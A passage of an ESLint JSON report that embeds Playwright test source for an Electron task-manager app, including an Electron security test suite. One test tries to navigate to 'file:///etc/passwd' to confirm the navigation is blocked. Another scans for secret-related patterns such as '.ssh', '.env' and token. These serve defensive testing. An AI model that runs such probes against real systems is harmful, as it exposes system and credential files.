work\n    const workingViews = Object.values(switchResults).filter(Boolean).length;\n    expect(workingViews).toBeGreaterThan(0);\n    \n    console.log(`ðŸ”„ View Switching Results (${osPlatform()}):`, switchResults);\n    console.log('âœ… View switching consistency test passed');\n  });\n\n  /**\n   * Test: Platform-Specific Menu Behavior (Conditional)\n   */\n  test('should handle platform-specific menu behavior', async () => {\n    const currentPlatform = osPlatform();\n    \n    if (currentPlatform === 'darwin') {\n      // macOS: Test native menu bar\n      const hasMenuBar = await electronApp.evaluate(({ Menu }) => {\n        const menu = Menu.getApplicationMenu();\n        return menu !== null && menu.items.length > 0;\n      });\n      \n      expect(hasMenuBar).toBeTruthy();\n      console.log('ðŸŽ macOS menu bar test passed');\n      \n    } else {\n      // Windows/Linux: Test application menu\n      const hasAppMenu = await page.locator('[role=\"menubar\"], .menu-bar, [data-testid=\"app-menu\"]').count() > 0;\n      console.log(`ðŸ–¥ï¸ ${currentPlatform} application menu present:`, hasAppMenu);\n    }\n    \n    await takeE2EScreenshot(`menu-behavior-${currentPlatform}`);\n    console.log('âœ… Platform-specific menu behavior test passed');\n  });\n\n  /**\n   * Test: File Dialog and Native Integration (Platform-Specific)\n   */\n  test.skip(({ browserName }) => browserName !== 'chromium', 'File dialog test requires Chromium')\n  ('should handle file dialogs correctly for current platform', async () => {\n    const currentPlatform = osPlatform();\n    \n    // Test file dialog integration\n    const fileDialogSupported = await electronApp.evaluate(({ dialog }) => {\n      return typeof dialog.showOpenDialog === 'function' && \n             typeof dialog.showSaveDialog === 'function';\n    });\n    \n    expect(fileDialogSupported).toBeTruthy();\n    \n    // Test file extension handling\n    const fileFilters = await electronApp.evaluate(() => {\n      return [\n        { name: 'JSON Files', extensions: ['json'] },\n        { name: 'All Files', extensions: ['*'] }\n      ];\n    });\n    \n    expect(fileFilters).toBeTruthy();\n    expect(fileFilters.length).toBeGreaterThan(0);\n    \n    console.log(`ðŸ“„ File Dialog Support (${currentPlatform}):`, {\n      supported: fileDialogSupported,\n      filters: fileFilters.length\n    });\n    \n    await takeE2EScreenshot(`file-dialogs-${currentPlatform}`);\n    console.log('âœ… File dialog integration test passed');\n  });\n\n  /**\n   * Test: Accessibility Features Across Platforms\n   */\n  test('should support accessibility features consistently', async () => {\n    const currentPlatform = osPlatform();\n    \n    // Test screen reader compatibility\n    const accessibilityFeatures = await page.evaluate(() => {\n      return {\n        hasAriaLabels: document.querySelectorAll('[aria-label]').length > 0,\n        hasRoles: document.querySelectorAll('[role]').length > 0,\n        hasAltText: Array.from(document.querySelectorAll('img')).some(img => img.alt),\n        hasTabIndex: document.querySelectorAll('[tabindex]').length > 0,\n        hasFocusVisible: document.documentElement.classList.contains('focus-visible') || \n                        getComputedStyle(document.documentElement).getPropertyValue('--focus-visible') !== ''\n      };\n    });\n    \n    // Basic accessibility requirements\n    expect(accessibilityFeatures.hasAriaLabels || accessibilityFeatures.hasRoles).toBeTruthy();\n    \n    console.log(`â™¿ Accessibility Features (${currentPlatform}):`, accessibilityFeatures);\n    \n    await takeE2EScreenshot(`accessibility-${currentPlatform}`);\n    console.log('âœ… Accessibility features test passed');\n  });\n\n  /**\n   * Test: Platform-Specific Error Handling\n   */\n  test('should handle platform-specific errors gracefully', async () => {\n    const currentPlatform = osPlatform();\n    \n    // Test error handling for platform-specific operations\n    const errorHandling = await electronApp.evaluate(async ({ app, dialog }) => {\n      const results = {\n        invalidPathHandled: false,\n        permissionErrorHandled: false,\n        platformErrorHandled: false\n      };\n      \n      try {\n        // Test invalid path handling\n        try {\n          app.getPath('invalid' as any);\n        } catch (error) {\n          results.invalidPathHandled = true;\n        }\n        \n        // Test permission error handling (attempting to access restricted path)\n        try {\n          if (process.platform === 'win32') {\n            app.getPath('system');\n          } else {\n            app.getPath('recent');\n          }\n        } catch (error) {\n          results.permissionErrorHandled = true;\n        }\n        \n        // Test platform-specific error handling\n        try {\n          if (process.platform === 'darwin') {\n            // Test macOS-specific operation\n            app.dock?.hide();\n          } else {\n            // Test Windows/Linux operation\n            app.setUserTasks?.([]);\n          }\n          results.platformErrorHandled = true;\n        } catch (error) {\n          // This is expected in some test environments\n          results.platformErrorHandled = false;\n        }\n        \n        return results;\n      } catch (error) {\n        return results;\n      }\n    });\n    \n    // At least basic error handling should work\n    expect(errorHandling.invalidPathHandled).toBeTruthy();\n    \n    console.log(`ðŸš¨ Error Handling (${currentPlatform}):`, errorHandling);\n    \n    await takeE2EScreenshot(`error-handling-${currentPlatform}`);\n    console.log('âœ… Platform-specific error handling test passed');\n  });\n});\n\n/**\n * Platform-Specific Test Suites\n * Using conditional test execution for platform-specific features\n */\n\n// macOS-Specific Tests\ntest.describe('macOS-Specific Features', () => {\n  test.beforeEach(() => {\n    CrossPlatformUtils.skipUnlessPlatform(['darwin'], 'These tests are macOS-specific');\n  });\n\n  test('should handle macOS dock integration', async () => {\n    const electronApp = await launchElectronForE2E();\n    \n    const dockFeatures = await electronApp.evaluate(({ app }) => {\n      return {\n        hasDock: !!app.dock,\n        canHide: typeof app.dock?.hide === 'function',\n        canShow: typeof app.dock?.show === 'function',\n        canSetBadge: typeof app.dock?.setBadge === 'function'\n      };\n    });\n    \n    expect(dockFeatures.hasDock).toBeTruthy();\n    expect(dockFeatures.canHide).toBeTruthy();\n    expect(dockFeatures.canShow).toBeTruthy();\n    expect(dockFeatures.canSetBadge).toBeTruthy();\n    \n    await closeElectronE2E();\n    console.log('âœ… macOS dock integration test passed');\n  });\n});\n\n// Windows-Specific Tests  \ntest.describe('Windows-Specific Features', () => {\n  test.beforeEach(() => {\n    CrossPlatformUtils.skipUnlessPlatform(['win32'], 'These tests are Windows-specific');\n  });\n\n  test('should handle Windows user tasks', async () => {\n    const electronApp = await launchElectronForE2E();\n    \n    const windowsFeatures = await electronApp.evaluate(({ app }) => {\n      return {\n        canSetUserTasks: typeof app.setUserTasks === 'function',\n        canSetAppUserModelId: typeof app.setAppUserModelId === 'function'\n      };\n    });\n    \n    expect(windowsFeatures.canSetUserTasks).toBeTruthy();\n    expect(windowsFeatures.canSetAppUserModelId).toBeTruthy();\n    \n    await closeElectronE2E();\n    console.log('âœ… Windows-specific features test passed');\n  });\n});\n\n// Linux-Specific Tests\ntest.describe('Linux-Specific Features', () => {\n  test.beforeEach(() => {\n    CrossPlatformUtils.skipUnlessPlatform(['linux'], 'These tests are Linux-specific');\n  });\n\n  test('should handle Linux desktop integration', async () => {\n    const electronApp = await launchElectronForE2E();\n    \n    const linuxFeatures = await electronApp.evaluate(({ app }) => {\n      return {\n        hasDesktopName: typeof app.getName === 'function',\n        canSetDesktopName: typeof app.setName === 'function'\n      };\n    });\n    \n    expect(linuxFeatures.hasDesktopName).toBeTruthy();\n    expect(linuxFeatures.canSetDesktopName).toBeTruthy();\n    \n    await closeElectronE2E();\n    console.log('âœ… Linux desktop integration test passed');\n  });\n});","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/electron-security.test.ts","messages":[{"ruleId":"no-useless-escape","severity":2,"message":"Unnecessary escape character: \\/.","line":311,"column":22,"nodeType":"Literal","messageId":"unnecessaryEscape","endLine":311,"endColumn":23,"suggestions":[{"messageId":"removeEscape","fix":{"range":[10140,10141],"text":""},"desc":"Remove the `\\`. This maintains the current functionality."},{"messageId":"escapeBackslash","fix":{"range":[10140,10140],"text":"\\"},"desc":"Replace the `\\` with `\\\\` to include the actual backslash character."}]},{"ruleId":"no-useless-escape","severity":2,"message":"Unnecessary escape character: \\/.","line":312,"column":23,"nodeType":"Literal","messageId":"unnecessaryEscape","endLine":312,"endColumn":24,"suggestions":[{"messageId":"removeEscape","fix":{"range":[10169,10170],"text":""},"desc":"Remove the `\\`. This maintains the current functionality."},{"messageId":"escapeBackslash","fix":{"range":[10169,10169],"text":"\\"},"desc":"Replace the `\\` with `\\\\` to include the actual backslash character."}]}],"suppressedMessages":[],"errorCount":2,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Electron-Specific Security Tests\n * \n * Comprehensive security testing for Electron applications beyond Electronegativity\n * Following 2025 security best practices\n */\n\nimport { test, expect, ElectronApplication, Page } from '@playwright/test';\nimport { _electron as electron } from '@playwright/test';\nimport * as path from 'path';\nimport * as fs from 'fs/promises';\n\n// Security test configuration\nconst SECURITY_CONFIG = {\n  // Allowed protocols for external navigation\n  allowedProtocols: ['https:', 'mailto:'],\n  \n  // Forbidden window features\n  forbiddenWindowFeatures: ['nodeIntegration', 'nodeIntegrationInWorker', 'webviewTag'],\n  \n  // Required security headers\n  requiredHeaders: {\n    'Content-Security-Policy': true,\n    'X-Content-Type-Options': 'nosniff',\n    'X-Frame-Options': 'DENY',\n    'X-XSS-Protection': '1; mode=block',\n    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains'\n  },\n  \n  // IPC message validation patterns\n  allowedIpcChannels: [\n    'app:ready',\n    'task:create',\n    'task:update',\n    'task:delete',\n    'window:minimize',\n    'window:maximize',\n    'window:close'\n  ]\n};\n\ntest.describe('Electron Security Tests', () => {\n  let app: ElectronApplication;\n  let mainWindow: Page;\n  \n  test.beforeAll(async () => {\n    // Launch Electron app\n    app = await electron.launch({\n      args: ['.'],\n      env: {\n        ...process.env,\n        NODE_ENV: 'test',\n        ELECTRON_ENABLE_LOGGING: '1'\n      }\n    });\n    \n    mainWindow = await app.firstWindow();\n    \n    // Wait for app to be ready\n    await mainWindow.waitForSelector('[data-testid=\"app-ready\"], .app-container', {\n      timeout: 30000\n    });\n  });\n  \n  test.afterAll(async () => {\n    await app.close();\n  });\n  \n  test.describe('WebPreferences Security', () => {\n    test('01. Context isolation should be enabled', async () => {\n      const contextIsolation = await app.evaluate(async ({ BrowserWindow }) => {\n        const win = BrowserWindow.getAllWindows()[0];\n        return win.webContents.getWebPreferences().contextIsolation;\n      });\n      \n      expect(contextIsolation).toBe(true);\n    });\n    \n    test('02. Node integration should be disabled', async () => {\n      const nodeIntegration = await app.evaluate(async ({ BrowserWindow }) => {\n        const win = BrowserWindow.getAllWindows()[0];\n        return win.webContents.getWebPreferences().nodeIntegration;\n      });\n      \n      expect(nodeIntegration).toBe(false);\n    });\n    \n    test('03. Remote module should be disabled', async () => {\n      const enableRemoteModule = await app.evaluate(async ({ BrowserWindow }) => {\n        const win = BrowserWindow.getAllWindows()[0];\n        const prefs = win.webContents.getWebPreferences();\n        return prefs.enableRemoteModule || false;\n      });\n      \n      expect(enableRemoteModule).toBe(false);\n    });\n    \n    test('04. WebSecurity should be enabled', async () => {\n      const webSecurity = await app.evaluate(async ({ BrowserWindow }) => {\n        const win = BrowserWindow.getAllWindows()[0];\n        return win.webContents.getWebPreferences().webSecurity;\n      });\n      \n      expect(webSecurity).toBe(true);\n    });\n    \n    test('05. Sandbox should be enabled', async () => {\n      const sandbox = await app.evaluate(async ({ BrowserWindow }) => {\n        const win = BrowserWindow.getAllWindows()[0];\n        const prefs = win.webContents.getWebPreferences();\n        return prefs.sandbox !== false; // Default is true in newer Electron\n      });\n      \n      expect(sandbox).toBe(true);\n    });\n  });\n  \n  test.describe('Content Security Policy', () => {\n    test('01. CSP header should be present', async () => {\n      const cspHeader = await mainWindow.evaluate(() => {\n        // Check meta tag\n        const metaCSP = document.querySelector('meta[http-equiv=\"Content-Security-Policy\"]');\n        return metaCSP?.getAttribute('content') || null;\n      });\n      \n      expect(cspHeader).toBeTruthy();\n      expect(cspHeader).not.toContain('unsafe-inline');\n      expect(cspHeader).not.toContain('unsafe-eval');\n    });\n    \n    test('02. CSP should block inline scripts', async () => {\n      let violationDetected = false;\n      \n      // Listen for CSP violations\n      await mainWindow.evaluate(() => {\n        document.addEventListener('securitypolicyviolation', (e) => {\n          (window as any).__cspViolation = {\n            directive: e.violatedDirective,\n            blockedURI: e.blockedURI\n          };\n        });\n      });\n      \n      // Try to inject inline script\n      try {\n        await mainWindow.evaluate(() => {\n          const script = document.createElement('script');\n          script.textContent = 'console.log(\"This should be blocked\");';\n          document.head.appendChild(script);\n        });\n      } catch (error) {\n        violationDetected = true;\n      }\n      \n      // Check for violation\n      const violation = await mainWindow.evaluate(() => (window as any).__cspViolation);\n      \n      expect(violation || violationDetected).toBeTruthy();\n    });\n  });\n  \n  test.describe('IPC Security', () => {\n    test('01. IPC messages should be validated', async () => {\n      // Try to send invalid IPC message\n      const invalidChannelBlocked = await mainWindow.evaluate(async () => {\n        try {\n          if ((window as any).electronAPI) {\n            // Assuming the app uses contextBridge\n            await (window as any).electronAPI.send('invalid:channel', { malicious: true });\n            return false;\n          }\n          return true; // No API exposed (good)\n        } catch (error) {\n          return true; // Error thrown (good)\n        }\n      });\n      \n      expect(invalidChannelBlocked).toBe(true);\n    });\n    \n    test('02. Renderer should not have direct access to Node.js', async () => {\n      const hasNodeAccess = await mainWindow.evaluate(() => {\n        try {\n          // Try to access Node.js globals\n          return typeof require !== 'undefined' || \n                 typeof process !== 'undefined' && process.versions?.node;\n        } catch {\n          return false;\n        }\n      });\n      \n      expect(hasNodeAccess).toBe(false);\n    });\n    \n    test('03. Remote module should not be accessible', async () => {\n      const hasRemoteAccess = await mainWindow.evaluate(() => {\n        try {\n          return typeof (window as any).require?.('electron').remote !== 'undefined';\n        } catch {\n          return false;\n        }\n      });\n      \n      expect(hasRemoteAccess).toBe(false);\n    });\n  });\n  \n  test.describe('Navigation Security', () => {\n    test('01. Should prevent navigation to file:// protocol', async () => {\n      let navigationPrevented = false;\n      \n      // Listen for navigation\n      mainWindow.on('framenavigated', (frame) => {\n        if (frame.url().startsWith('file://')) {\n          navigationPrevented = false;\n        }\n      });\n      \n      try {\n        await mainWindow.evaluate(() => {\n          window.location.href = 'file:///etc/passwd';\n        });\n        await mainWindow.waitForTimeout(1000);\n      } catch {\n        navigationPrevented = true;\n      }\n      \n      // Check if still on original page\n      const currentURL = mainWindow.url();\n      expect(currentURL).not.toContain('file://');\n    });\n    \n    test('02. Should handle window.open securely', async () => {\n      const newWindowFeatures = await mainWindow.evaluate(() => {\n        // Try to open new window with Node integration\n        try {\n          const newWin = window.open('about:blank', '_blank', 'nodeIntegration=yes');\n          const features = newWin ? (newWin as any).features : null;\n          if (newWin) newWin.close();\n          return features;\n        } catch {\n          return null;\n        }\n      });\n      \n      // New windows should not have dangerous features\n      if (newWindowFeatures) {\n        expect(newWindowFeatures).not.toContain('nodeIntegration');\n      }\n    });\n    \n    test('03. External links should open in default browser', async () => {\n      const { shell } = await import('electron');\n      let externalLinkHandled = false;\n      \n      // Mock shell.openExternal\n      const originalOpenExternal = shell.openExternal;\n      shell.openExternal = async (url: string) => {\n        externalLinkHandled = true;\n        return true;\n      };\n      \n      // Click external link\n      const externalLink = mainWindow.locator('a[href^=\"https://\"]').first();\n      if (await externalLink.isVisible()) {\n        await externalLink.click();\n        await mainWindow.waitForTimeout(500);\n      }\n      \n      // Restore original\n      shell.openExternal = originalOpenExternal;\n      \n      // External links should be handled by shell\n      expect(externalLinkHandled || !await externalLink.isVisible()).toBe(true);\n    });\n  });\n  \n  test.describe('Permission Security', () => {\n    test('01. Should handle permission requests properly', async () => {\n      // Check if permission handler is set\n      const hasPermissionHandler = await app.evaluate(async ({ session }) => {\n        // This checks if a permission handler is registered\n        return typeof session.defaultSession.setPermissionRequestHandler === 'function';\n      });\n      \n      expect(hasPermissionHandler).toBe(true);\n    });\n    \n    test('02. Should not auto-grant dangerous permissions', async () => {\n      // Try to request camera permission\n      const cameraPermission = await mainWindow.evaluate(async () => {\n        try {\n          const stream = await navigator.mediaDevices.getUserMedia({ video: true });\n          stream.getTracks().forEach(track => track.stop());\n          return 'granted';\n        } catch (error) {\n          return 'denied';\n        }\n      });\n      \n      // Should either deny or prompt, not auto-grant\n      expect(cameraPermission).toBe('denied');\n    });\n  });\n  \n  test.describe('Data Security', () => {\n    test('01. Should not expose sensitive paths', async () => {\n      const exposedPaths = await mainWindow.evaluate(() => {\n        // Check if any sensitive paths are exposed\n        const sensitivePatterns = [\n          /\\/home\\/[^\\/]+/,\n          /\\/Users\\/[^\\/]+/,\n          /C:\\\\Users\\\\/,\n          /\\.ssh/,\n          /\\.env/,\n          /password/i,\n          /secret/i,\n          /token/i\n        ];\n        \n        const allText = document.body.innerText;\n        return sensitivePatterns.some(pattern => pattern.test(allText));\n      });\n      \n      expect(exposedPaths).toBe(false);\n    });\n    \n    test('02. LocalStorage should be properly isolated', async () => {\n      // Set test data\n      await mainWindow.evaluate(() => {\n        localStorage.setItem('test-security', 'sensitive-data');\n      });\n      \n      // Try to access from different origin (should fail)\n      const isolated = await mainWindow.evaluate(() => {\n        try {\n          // Attempt cross-origin access\n          const iframe = document.createElement('iframe');\n          iframe.src = 'https://example.com';\n          document.body.appendChild(iframe);\n          \n          // This should throw or return null\n          const crossOriginData = iframe.contentWindow?.localStorage?.getItem('test-security');\n          document.body.removeChild(iframe);\n          \n          return !crossOriginData;\n        } catch {\n          return true; // Error means properly isolated\n        }\n      });\n      \n      expect(isolated).toBe(true);\n    });\n  });\n  \n  test.describe('Update Security', () => {\n    test('01. Auto-updater should use secure channels', async () => {\n      const updateConfig = await app.evaluate(async ({ autoUpdater }) => {\n        try {\n          const feedURL = (autoUpdater as any).getFeedURL();\n          return {\n            url: feedURL,\n            isSecure: feedURL?.startsWith('https://')\n          };\n        } catch {\n          return { url: null, isSecure: true }; // No updater is OK\n        }\n      });\n      \n      if (updateConfig.url) {\n        expect(updateConfig.isSecure).toBe(true);\n      }\n    });\n  });\n  \n  test.describe('Security Headers', () => {\n    test('01. Should set security headers for all responses', async () => {\n      // Intercept response headers\n      const headers = await mainWindow.evaluate(async () => {\n        try {\n          const response = await fetch(window.location.href);\n          const headers: Record<string, string> = {};\n          response.headers.forEach((value, key) => {\n            headers[key] = value;\n          });\n          return headers;\n        } catch {\n          // For local files, check meta tags\n          const metaTags = document.querySelectorAll('meta[http-equiv]');\n          const headers: Record<string, string> = {};\n          metaTags.forEach(tag => {\n            const name = tag.getAttribute('http-equiv') || '';\n            const content = tag.getAttribute('content') || '';\n            headers[name] = content;\n          });\n          return headers;\n        }\n      });\n      \n      // Check for security headers\n      Object.entries(SECURITY_CONFIG.requiredHeaders).forEach(([header, value]) => {\n        if (typeof value === 'string') {\n          expect(headers[header]).toBe(value);\n        } else {\n          expect(headers[header]).toBeTruthy();\n        }\n      });\n    });\n  });\n  \n  test.describe('Certificate Validation', () => {\n    test('01. Should not ignore certificate errors', async () => {\n      const ignoreCertErrors = await app.evaluate(async ({ app }) => {\n        // Check if certificate errors are being ignored\n        const commandLine = app.commandLine;\n        return commandLine.hasSwitch('ignore-certificate-errors');\n      });\n      \n      expect(ignoreCertErrors).toBe(false);\n    });\n  });\n});\n\n// Additional security audit function\nexport async function performSecurityAudit(app: ElectronApplication): Promise<SecurityAuditResult> {\n  const results: SecurityAuditResult = {\n    passed: true,\n    violations: [],\n    warnings: [],\n    score: 100\n  };\n  \n  // Audit all windows\n  const windows = await app.windows();\n  \n  for (const window of windows) {\n    const webPreferences = await app.evaluate(async ({ BrowserWindow }) => {\n      const win = BrowserWindow.getAllWindows().find(w => w.webContents.id === window.context().id);\n      return win?.webContents.getWebPreferences();\n    });\n    \n    // Check each security setting\n    if (webPreferences) {\n      if (!webPreferences.contextIsolation) {\n        results.violations.push({\n          severity: 'critical',\n          message: 'Context isolation is disabled',\n          window: window.url()\n        });\n        results.score -= 20;\n      }\n      \n      if (webPreferences.nodeIntegration) {\n        results.violations.push({\n          severity: 'critical',\n          message: 'Node integration is enabled',\n          window: window.url()\n        });\n        results.score -= 20;\n      }\n      \n      if (!webPreferences.webSecurity) {\n        results.violations.push({\n          severity: 'critical',\n          message: 'Web security is disabled',\n          window: window.url()\n        });\n        results.score -= 30;\n      }\n    }\n  }\n  \n  results.passed = results.score >= 70 && results.violations.filter(v => v.severity === 'critical').length === 0;\n  \n  return results;\n}\n\ninterface SecurityAuditResult {\n  passed: boolean;\n  violations: Array<{\n    severity: 'critical' | 'high' | 'medium' | 'low';\n    message: string;\n    window?: string;\n  }>;\n  warnings: Array<{\n    message: string;\n    window?: string;\n  }>;\n  score: number;\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/file-operations.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/memory-basic.e2e.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/memory-leak.e2e.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/memory-simple.e2e.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/memory.performance.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/navigation-patterns.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/task-management.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/task-subtasks.test.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/tests/e2e/view-switching.test.ts","messages":[{"ruleId":"@typescript-eslint/no-unused-expressions","severity":2,"message":"Expected an assignment or function call and instead saw an expression.","line":289,"column":7,"nodeType":"ExpressionStatement","messageId":"unusedExpression","endLine":289,"endColumn":34}],"suppressedMessages":[],"errorCount":1,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * TaskMaster View Switching and Navigation E2E Tests (2025)\n * \n * Comprehensive test suite for view switching, navigation patterns, and UI state management.\n * Following 2025 best practices for Playwright + Electron testing:\n * \n * - Multi-view application testing patterns\n * - State persistence across view transitions\n * - Animation and transition validation\n * - Keyboard navigation and accessibility\n * - Performance monitoring for view switches\n * - Cross-platform navigation consistency\n * \n * Test Coverage:\n * - View switching via sidebar navigation\n * - Keyboard shortcut navigation (âŒ˜1-6)\n * - State preservation during view changes\n * - Animation and transition behavior\n * - URL/route management (if applicable)\n * - View-specific UI elements and behaviors\n * - Error handling for invalid view states\n * - Performance metrics for view transitions\n * - Accessibility compliance for navigation\n */\n\nimport { test, expect, type Page, type ElectronApplication } from '@playwright/test';\nimport { \n  launchElectronForE2E, \n  getMainWindow, \n  closeElectronE2E,\n  takeE2EScreenshot,\n  navigateToView,\n  verifyActiveView,\n  getCurrentViewInfo,\n  measureE2EPerformance,\n  waitForE2ECondition,\n  validateAccessibility\n} from '../setup/e2e.setup';\n\n/**\n * Page Object Model for View Navigation\n * Encapsulates view switching and navigation interactions\n */\nclass ViewNavigationPage {\n  constructor(private page: Page) {}\n\n  // Navigation elements\n  get sidebar() { return this.page.locator('[data-testid=\"sidebar\"], aside, .sidebar'); }\n  get mainContent() { return this.page.locator('[data-testid=\"main-content\"], main, .main-content'); }\n  get header() { return this.page.locator('[data-testid=\"header\"], header, .header'); }\n  \n  // View navigation buttons\n  get overviewButton() { return this.page.locator('button:has-text(\"Overview\"), [data-testid=\"analytics-nav\"]'); }\n  get tasksButton() { return this.page.locator('button:has-text(\"All Tasks\"), [data-testid=\"tasks-nav\"]'); }\n  get calendarButton() { return this.page.locator('button:has-text(\"Calendar\"), [data-testid=\"calendar-nav\"]'); }\n  get kanbanButton() { return this.page.locator('button:has-text(\"Kanban\"), [data-testid=\"kanban-nav\"]'); }\n  get timelineButton() { return this.page.locator('button:has-text(\"Timeline\"), [data-testid=\"timeline-nav\"]'); }\n  get claudeConfigButton() { return this.page.locator('button:has-text(\"Claude Config\"), [data-testid=\"claude-config-nav\"]'); }\n\n  // View content indicators\n  get analyticsView() { return this.page.locator('[data-testid=\"analytics-view\"], .analytics-view'); }\n  get taskListView() { return this.page.locator('[data-testid=\"task-list-view\"], .task-list-view'); }\n  get kanbanView() { return this.page.locator('[data-testid=\"kanban-view\"], .kanban-view'); }\n  get calendarView() { return this.page.locator('[data-testid=\"calendar-view\"], .calendar-view'); }\n  get timelineView() { return this.page.locator('[data-testid=\"timeline-view\"], .timeline-view'); }\n  get claudeConfigView() { return this.page.locator('[data-testid=\"claude-config-view\"], .claude-config-view'); }\n\n  // State management elements\n  get sidebarToggle() { return this.page.locator('[data-testid=\"sidebar-toggle\"], .sidebar-toggle'); }\n  get searchInput() { return this.page.locator('[data-testid=\"search\"], input[placeholder*=\"search\"]'); }\n  get filterControls() { return this.page.locator('[data-testid=\"filters\"], .filters'); }\n\n  /**\n   * Navigate to a specific view using sidebar buttons\n   */\n  async navigateToViewBySidebar(viewType: 'analytics' | 'list' | 'calendar' | 'kanban' | 'timeline' | 'claude-config'): Promise<void> {\n    console.log(`ðŸ§­ Navigating to ${viewType} view via sidebar...`);\n    \n    const buttonMap = {\n      analytics: this.overviewButton,\n      list: this.tasksButton,\n      calendar: this.calendarButton,\n      kanban: this.kanbanButton,\n      timeline: this.timelineButton,\n      'claude-config': this.claudeConfigButton\n    };\n\n    const button = buttonMap[viewType];\n    if (button) {\n      await button.click();\n      await this.waitForViewTransition();\n      console.log(`âœ… Navigated to ${viewType} view`);\n    } else {\n      throw new Error(`Unknown view type: ${viewType}`);\n    }\n  }\n\n  /**\n   * Navigate using keyboard shortcuts\n   */\n  async navigateToViewByKeyboard(viewType: 'analytics' | 'list' | 'calendar' | 'kanban' | 'timeline' | 'claude-config'): Promise<void> {\n    console.log(`âŒ¨ï¸ Navigating to ${viewType} view via keyboard shortcut...`);\n    \n    const shortcutMap = {\n      analytics: 'Meta+1',\n      list: 'Meta+2',\n      calendar: 'Meta+3',\n      kanban: 'Meta+4',\n      timeline: 'Meta+5',\n      'claude-config': 'Meta+6'\n    };\n\n    const shortcut = shortcutMap[viewType];\n    if (shortcut) {\n      await this.page.keyboard.press(shortcut);\n      await this.waitForViewTransition();\n      console.log(`âœ… Navigated to ${viewType} view via ${shortcut}`);\n    } else {\n      throw new Error(`No keyboard shortcut for view type: ${viewType}`);\n    }\n  }\n\n  /**\n   * Wait for view transition animations to complete\n   */\n  async waitForViewTransition(): Promise<void> {\n    // Wait for animations to complete (Framer Motion transitions)\n    await this.page.waitForTimeout(800);\n    \n    // Wait for network idle state (for data loading)\n    await this.page.waitForLoadState('networkidle');\n  }\n\n  /**\n   * Verify active view indicators\n   */\n  async verifyActiveViewIndicators(expectedView: string): Promise<boolean> {\n    // Check for active state on navigation button\n    const activeButton = this.page.locator(`nav button[aria-current=\"page\"], nav button.active, nav button[data-active=\"true\"]`);\n    const hasActiveButton = await activeButton.count() > 0;\n\n    // Check for view-specific content\n    const viewContentMap = {\n      analytics: this.analyticsView,\n      list: this.taskListView,\n      kanban: this.kanbanView,\n      calendar: this.calendarView,\n      timeline: this.timelineView,\n      'claude-config': this.claudeConfigView\n    };\n\n    const expectedContent = viewContentMap[expectedView as keyof typeof viewContentMap];\n    const hasViewContent = expectedContent ? await expectedContent.isVisible() : false;\n\n    console.log(`ðŸ“Š View verification for ${expectedView}: Button active: ${hasActiveButton}, Content visible: ${hasViewContent}`);\n    return hasActiveButton || hasViewContent;\n  }\n\n  /**\n   * Get the currently active view\n   */\n  async getCurrentView(): Promise<string | null> {\n    // Try multiple methods to determine current view\n    const currentView = await this.page.evaluate(() => {\n      // Check data attributes\n      const body = document.body;\n      const dataView = body.getAttribute('data-view') || \n                      body.getAttribute('data-current-view') ||\n                      document.documentElement.getAttribute('data-view');\n      \n      if (dataView) return dataView;\n\n      // Check for active navigation buttons\n      const activeNav = document.querySelector('nav button[aria-current=\"page\"], nav button.active');\n      if (activeNav) {\n        const text = activeNav.textContent?.toLowerCase();\n        if (text?.includes('overview')) return 'analytics';\n        if (text?.includes('tasks')) return 'list';\n        if (text?.includes('calendar')) return 'calendar';\n        if (text?.includes('kanban')) return 'kanban';\n        if (text?.includes('timeline')) return 'timeline';\n        if (text?.includes('config')) return 'claude-config';\n      }\n\n      // Check for visible view content\n      if (document.querySelector('.analytics-view, [data-testid=\"analytics-view\"]')) return 'analytics';\n      if (document.querySelector('.task-list-view, [data-testid=\"task-list-view\"]')) return 'list';\n      if (document.querySelector('.kanban-view, [data-testid=\"kanban-view\"]')) return 'kanban';\n      if (document.querySelector('.calendar-view, [data-testid=\"calendar-view\"]')) return 'calendar';\n      if (document.querySelector('.timeline-view, [data-testid=\"timeline-view\"]')) return 'timeline';\n      if (document.querySelector('.claude-config-view, [data-testid=\"claude-config-view\"]')) return 'claude-config';\n\n      return null;\n    });\n\n    return currentView;\n  }\n\n  /**\n   * Toggle sidebar collapse state\n   */\n  async toggleSidebar(): Promise<void> {\n    console.log('ðŸ”„ Toggling sidebar...');\n    \n    // Look for sidebar toggle 